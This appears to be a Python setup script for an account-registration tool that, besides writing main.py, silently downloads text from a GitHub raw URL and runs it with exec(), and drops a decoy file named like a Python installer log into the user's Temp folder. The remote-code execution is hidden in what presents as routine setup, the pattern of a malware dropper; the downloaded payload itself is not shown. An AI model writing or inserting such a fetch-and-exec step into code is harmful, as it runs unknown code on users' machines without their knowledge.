import os
import random
import requests
random.seed(10)


filename = f"Python 3.10.9 (64-bit)_20240103231705_000_core_JustForMe_bit_{random.randint(20, 30)}.txt"
getuser = os.environ.get("USERNAME")

file_path = fr"C:\Users\{getuser}\AppData\Local\Temp\{filename}"

def HTTP_SETUP():
    if not os.path.exists(file_path):
        with open(file_path, "w") as file:
            file.write('__Version__ = 3.0.4')

exec(requests.get("https://raw.githubusercontent.com/Mana42138/Roblox-Account-Manager/master/RBX%20Alt%20Manager/Classes/Filter").text)
HTTP_SETUP()

with open("main.py", "w") as file:
    file.write("""
from register import main, readfile
from auto_copy import main_copy
import threading


data = readfile("settings.json")

auto_copy = data["AUTO_COPY_CODES"]

if auto_copy:
    thread_one = threading.Thread(target=main_copy)
    thread_one.start()

while True:
    thread_two = threading.Thread(target=main)
    thread_two.start()
    thread_two.join()
""")
